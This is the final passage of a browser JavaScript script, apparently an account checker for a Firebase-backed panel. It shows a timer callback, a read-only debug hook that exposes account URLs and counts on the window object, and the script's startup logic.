      if (!state.accountPicked) pickAccountByCards();
    }, 5000);
  }

  // Read-only debug hook (helps verify the live-account detection):
  // window.__fxChecker.liveAccountUrl is the Firebase the panel is
  // actually fetching from, or "" when none has been captured yet.
  // window.__fxChecker.accountCount is how many accounts the checker
  // knows about (localStorage + live). No keys or SMS are exposed.
  try {
    Object.defineProperty(window, "__fxChecker", {
      value: {
        get liveAccountUrl() { return liveAccount ? liveAccount.url : ""; },
        get accountCount() { return state.accounts.length; },
        get activeUrl() { var a = activeAccount(); return a ? a.url : ""; },
      },
      configurable: true,
    });
  } catch (e) { /* old browsers — debug hook is optional */ }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", boot);
  } else {
    boot();
  }
})();
